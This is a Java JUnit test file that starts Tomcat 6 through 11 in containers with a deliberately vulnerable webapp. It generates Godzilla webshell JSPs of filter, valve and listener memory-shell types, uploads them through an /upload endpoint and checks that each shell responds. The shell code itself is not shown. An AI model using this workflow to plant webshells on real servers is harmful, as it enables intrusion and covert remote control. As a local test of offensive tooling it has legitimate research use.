package tomcat;

import com.reajason.javaweb.config.Constants;
import com.reajason.javaweb.config.GodzillaShellConfig;
import com.reajason.javaweb.memsell.tomcat.TomcatShell;
import lombok.extern.slf4j.Slf4j;
import net.bytebuddy.jar.asm.Opcodes;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.testcontainers.containers.GenericContainer;
import org.testcontainers.containers.wait.strategy.Wait;
import org.testcontainers.junit.jupiter.Container;
import org.testcontainers.junit.jupiter.Testcontainers;
import org.testcontainers.utility.MountableFile;

import java.nio.file.Paths;

/**
 * @author ReaJason
 * @since 2024/11/28
 */
@Testcontainers
@Slf4j
public class TomcatGodzillaTest implements GodzillaTest {

    public static final MountableFile warFile = MountableFile.forHostPath(Paths.get("../vul-webapp/build/libs/vul-webapp.war").toAbsolutePath());
    public static final MountableFile warJakartaFile = MountableFile.forHostPath(Paths.get("../vul-webapp-jakarta/build/libs/vul-webapp-jakarta.war").toAbsolutePath());

    public static final String tomcat6ImageName = "tomcat:6.0.53-jre7";
    public static final String tomcat7ImageName = "tomcat:7.0.85-jre7";
    public static final String tomcat8ImageName = "tomcat:8-jre8";
    public static final String tomcat9ImageName = "tomcat:9-jre8";
    public static final String tomcat10ImageName = "tomcat:10.1-jre11";
    public static final String tomcat11ImageName = "tomcat:11.0-jre17";

    @Nested
    class Tomcat6Godzilla {

        @Container
        public final GenericContainer<?> tomcat6 = new GenericContainer<>(tomcat6ImageName)
                .withCopyToContainer(warFile, "/usr/local/tomcat/webapps/app.war")
                .waitingFor(Wait.forHttp("/app"))
                .withExposedPorts(8080);

        public String getUrl() {
            String host = tomcat6.getHost();
            int port = tomcat6.getMappedPort(8080);
            String url = "http://" + host + ":" + port + "/app";
            log.info("container started, app url is : {}", url);
            return url;
        }

        @Test
        void testGodzillaFilter() {
            String shellType = TomcatShell.FILTER;
            testGodzilla(getUrl(), tomcat6ImageName, shellType);
        }

        @Test
        void testGodzillaValve() {
            String shellType = TomcatShell.VALVE;
            testGodzilla(getUrl(), tomcat6ImageName, shellType);
        }

        @Test
        void testGodzillaListener() {
            String shellType = TomcatShell.LISTENER;
            testGodzilla(getUrl(), tomcat6ImageName, shellType);
        }
    }

    @Nested
    class Tomcat7Godzilla {

        @Container
        public final GenericContainer<?> tomcat7 = new GenericContainer<>(tomcat7ImageName)
                .withCopyToContainer(warFile, "/usr/local/tomcat/webapps/app.war")
                .waitingFor(Wait.forHttp("/app"))
                .withExposedPorts(8080);

        public String getUrl() {
            String host = tomcat7.getHost();
            int port = tomcat7.getMappedPort(8080);
            String url = "http://" + host + ":" + port + "/app";
            log.info("container started, app url is : {}", url);
            return url;
        }

        @Test
        void testGodzillaFilter() {
            String shellType = TomcatShell.FILTER;
            testGodzilla(getUrl(), tomcat7ImageName, shellType);
        }

        @Test
        void testGodzillaValve() {
            String shellType = TomcatShell.VALVE;
            testGodzilla(getUrl(), tomcat7ImageName, shellType);
        }

        @Test
        void testGodzillaListener() {
            String shellType = TomcatShell.LISTENER;
            testGodzilla(getUrl(), tomcat7ImageName, shellType);
        }
    }

    @Nested
    class Tomcat8Godzilla {

        @Container
        public final GenericContainer<?> tomcat8 = new GenericContainer<>(tomcat8ImageName)
                .withCopyToContainer(warFile, "/usr/local/tomcat/webapps/app.war")
                .waitingFor(Wait.forHttp("/app"))
                .withExposedPorts(8080);

        public String getUrl() {
            String host = tomcat8.getHost();
            int port = tomcat8.getMappedPort(8080);
            String url = "http://" + host + ":" + port + "/app";
            log.info("container started, app url is : {}", url);
            return url;
        }

        @Test
        void testGodzillaFilter() {
            String shellType = TomcatShell.FILTER;
            testGodzilla(getUrl(), tomcat8ImageName, shellType);
        }

        @Test
        void testGodzillaValve() {
            String shellType = TomcatShell.VALVE;
            testGodzilla(getUrl(), tomcat8ImageName, shellType);
        }

        @Test
        void testGodzillaListener() {
            String shellType = TomcatShell.LISTENER;
            testGodzilla(getUrl(), tomcat8ImageName, shellType);
        }
    }

    @Nested
    class Tomcat9Godzilla {

        @Container
        public final GenericContainer<?> tomcat9 = new GenericContainer<>(tomcat9ImageName)
                .withCopyToContainer(warFile, "/usr/local/tomcat/webapps/app.war")
                .waitingFor(Wait.forHttp("/app"))
                .withExposedPorts(8080);

        public String getUrl() {
            String host = tomcat9.getHost();
            int port = tomcat9.getMappedPort(8080);
            String url = "http://" + host + ":" + port + "/app";
            log.info("container started, app url is : {}", url);
            return url;
        }

        @Test
        void testGodzillaFilter() {
            String shellType = TomcatShell.FILTER;
            testGodzilla(getUrl(), tomcat9ImageName, shellType);
        }

        @Test
        void testGodzillaValve() {
            String shellType = TomcatShell.VALVE;
            testGodzilla(getUrl(), tomcat9ImageName, shellType);
        }

        @Test
        void testGodzillaListener() {
            String shellType = TomcatShell.LISTENER;
            testGodzilla(getUrl(), tomcat9ImageName, shellType);
        }
    }

    @Nested
    class Tomcat10Godzilla {

        @Container
        public final GenericContainer<?> tomcat10 = new GenericContainer<>(tomcat10ImageName)
                .withCopyToContainer(warJakartaFile, "/usr/local/tomcat/webapps/app.war")
                .waitingFor(Wait.forHttp("/app"))
                .withExposedPorts(8080);

        public String getUrl() {
            String host = tomcat10.getHost();
            int port = tomcat10.getMappedPort(8080);
            String url = "http://" + host + ":" + port + "/app";
            log.info("container started, app url is : {}", url);
            return url;
        }

        @Test
        void testGodzillaFilter() {
            String shellType = TomcatShell.JAKARTA_FILTER;
            testSpecificJdkGodzilla(getUrl(), tomcat10ImageName, shellType, Opcodes.V11);
        }

        @Test
        void testGodzillaValve() {
            String shellType = TomcatShell.JAKARTA_VALVE;
            testSpecificJdkGodzilla(getUrl(), tomcat10ImageName, shellType, Opcodes.V11);
        }

        @Test
        void testGodzillaListener() {
            String shellType = TomcatShell.JAKARTA_LISTENER;
            testSpecificJdkGodzilla(getUrl(), tomcat10ImageName, shellType, Opcodes.V11);
        }
    }

    @Nested
    class Tomcat11Godzilla {

        @Container
        public final GenericContainer<?> tomcat11 = new GenericContainer<>(tomcat11ImageName)
                .withCopyToContainer(warJakartaFile, "/usr/local/tomcat/webapps/app.war")
                .waitingFor(Wait.forHttp("/app"))
                .withExposedPorts(8080);

        public String getUrl() {
            String host = tomcat11.getHost();
            int port = tomcat11.getMappedPort(8080);
            String url = "http://" + host + ":" + port + "/app";
            log.info("container started, app url is : {}", url);
            return url;
        }

        @Test
        void testGodzillaFilter() {
            String shellType = TomcatShell.JAKARTA_FILTER;
            testSpecificJdkGodzilla(getUrl(), tomcat11ImageName, shellType, Opcodes.V17);
        }

        @Test
        void testGodzillaValve() {
            String shellType = TomcatShell.JAKARTA_VALVE;
            testSpecificJdkGodzilla(getUrl(), tomcat11ImageName, shellType, Opcodes.V17);
        }

        @Test
        void testGodzillaListener() {
            String shellType = TomcatShell.JAKARTA_LISTENER;
            testSpecificJdkGodzilla(getUrl(), tomcat11ImageName, shellType, Opcodes.V17);
        }
    }


    private void testGodzilla(String url, String imageName, String shellType) {
        testSpecificJdkGodzilla(url, imageName, shellType, Constants.DEFAULT_VERSION);
    }

    private void testSpecificJdkGodzilla(String url, String imageName, String shellType, int targetJdkVersion) {
        String pass = "pass" + shellType;
        String key = "key" + shellType;
        String headerValue = imageName + "Godzilla" + shellType;
        GodzillaShellConfig shellConfig = GodzillaShellConfig.builder()
                .pass(pass).key(key)
                .headerName("User-Agent").headerValue(headerValue)
                .build();
        String jspContent = generateGodzillaJsp(shellConfig, shellType, targetJdkVersion);
        log.info("generated {} godzilla with pass: {}, key: {}, headerValue: {}", shellType, pass, key, headerValue);
        String filename = shellType + ".jsp";
        String uploadEntry = url + "/upload";
        String jspEntry = url + "/" + filename;
        uploadJspFileToServer(uploadEntry, filename, jspContent);
        verifyContainerResponse(jspEntry);
        testGodzillaIsOk(jspEntry, shellConfig);
    }
}